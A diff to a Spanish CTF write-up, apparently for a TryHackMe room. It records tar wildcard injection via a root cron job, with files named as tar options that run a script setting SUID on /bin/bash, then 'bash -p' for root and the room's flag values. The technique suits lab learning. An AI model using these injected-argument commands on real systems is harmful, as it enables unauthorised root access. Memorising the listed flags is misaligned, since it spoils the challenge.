@@ -173,41 +173,55 @@ Puntos que lo hacen explotable:
 
 ## 7. Wildcard injection en `tar`
 
-Todo dentro de `/opt/backups`:
+Todo dentro de `/opt/backups` (secuencia final que funcionó):
 
 ```bash
 cd /opt/backups
-echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' > priv.sh
-chmod +x priv.sh
+echo 'chmod +s /bin/bash' > privesc.sh
+chmod +x privesc.sh
 touch -- '--checkpoint=1'
-touch -- '--checkpoint-action=exec=sh priv.sh'
+touch -- '--checkpoint-action=exec=sh privesc.sh'
 ls -la
 ```
 
 ![[Pasted image 20261117113312.png]]
 
+*Primer intento de payload (con ruta relativa, no funcionaba).*
+
 ![[Pasted image 20261117113330.png]]
 
-Cuando el cron ejecute `tar czf ... *`, el globo expande también los ficheros `--checkpoint=1` y `--checkpoint-action=exec=sh priv.sh`, que `tar` interpreta como **argumentos propios** → lanza `sh priv.sh` **como root**.
+*Creación de los ficheros `--checkpoint*` (fíjate en el error `toych` y en que `touch` necesita el `--` para aceptar opciones que empiezan por guiones).*
 
-> **⚠️ Corrección al intento de la captura:** el `priv.sh` de la imagen dice `chmod +s bin/bash` (ruta **relativa**) y el cron hace `cd /opt/backups` antes, así que `bin/bash` no existe ahí y fallará. Usar ruta absoluta:
+Cuando el cron ejecute `tar czf ... *`, el globo expande también los ficheros `--checkpoint=1` y `--checkpoint-action=exec=sh privesc.sh`, que `tar` interpreta como **argumentos propios** → lanza `sh privesc.sh` **como root**.
+
+> **⚠️ Errores que salieron por el camino:**
 >
-> ```bash
-> echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' > priv.sh
-> ```
->
-> (o en su defecto `chmod +s /bin/bash`). Además, crear los dos ficheros `--checkpoint*` con `touch --` (o el `tar` no los ve como argumentos y el payload no se dispara).
+> 1. **Ruta relativa en el payload:** `chmod +s bin/bash` falla porque el cron hace `cd /opt/backups` antes y ahí no existe `bin/bash`. Solución: ruta absoluta → `chmod +s /bin/bash` (o `cp /bin/bash /tmp/bash && chmod +s /tmp/bash`).
+> 2. **`touch --"--checkpoint=1"` sin espacio:** sale `touch: unrecognized option '---checkpoint=1'`. El `--` debe ir **separado** de la opción: `touch -- '--checkpoint=1'`.
 
 ---
 
-## 8. Pendiente
+## 8. Resultado: root y flag
 
-- [ ] Esperar ~1 minuto a que el cron corra el `tar`.
-- [ ] Comprobar el binario SUID: `ls -l /tmp/bash` (o `/bin/bash`).
-- [ ] Shell root: `/tmp/bash -p` → `whoami` → `id`.
-- [ ] Capturar la flag de root: `cd /root && cat flag.txt`.
+Tras esperar ~1 minuto a que el cron procesara el directorio con los argumentos inyectados:
 
-*(Valor según writeups públicos de la sala — verificar al capturarla: `THM{e6ee84a483d67ade06936fcfd1433e8a}`.)*
+```bash
+/bin/bash -p
+id
+cd /root
+cat flag.txt
+```
+
+![[Pasted image 20261117120946.png]]
+
+- `id` → `uid=1001(webdev) ... euid=0(root)`: con `bash -p` el **euid efectivo es 0** aunque el real siga siendo `webdev`; `-p` impide que bash descarte el privilegio SUID.
+- `/root` contiene `flag.txt` y `snap`.
+
+**Flag de root:**
+
+```
+THM{e6ee84a483d67ade06936fcfd1433e8a}
+```
 
 ---
 
@@ -216,12 +230,13 @@ Cuando el cron ejecute `tar czf ... *`, el globo expande también los ficheros `
 | Flag | Valor |
 | --- | --- |
 | Usuario (`/home/webdev/user.txt`) | `THM{96dc7bd50d2fb98fcece01560788b5ab}` |
-| Root (`/root/flag.txt`) | *pendiente de capturar* |
+| Root (`/root/flag.txt`) | `THM{e6ee84a483d67ade06936fcfd1433e8a}` |
 
 1. **FTP anónimo = copias de seguridad del código**: `backup.tar.gz` entregó `app.py` sin tocar la web.
 2. **SSRF con allowlist** se salta el filtro usando el host confiable (`kestrel.thm`) como intermediary hacia `127.0.0.1`.
 3. **pspy hace visible el cron invisible**: si root ejecuta `tar ... *` en un directorio tuyo, sospecha *wildcard injection*.
 4. **Rutas absolutas en los payloads**: `chmod +s bin/bash` no es lo mismo que `chmod +s /bin/bash` cuando el cwd lo decide el cron.
-5. **`touch --`** con `--` para crear ficheros que empiezan por guiones.
+5. **`touch --`** con `--` **separado** para crear ficheros que empiezan por guiones.
+6. **`euid` vs `uid`**: un binario SUID solo levanta el euid; por eso se comprueba con `id` y se usa `bash -p`.
 
 > Comandos relacionados: `Comando Rapido/Enumeracion web.md`, `Comando Rapido/Escalada de privilegios Linux.md`, `Comando Rapido/Shells y transferencia.md`, `Comando Rapido/Comandos básicos.md` (FTP/SCP).
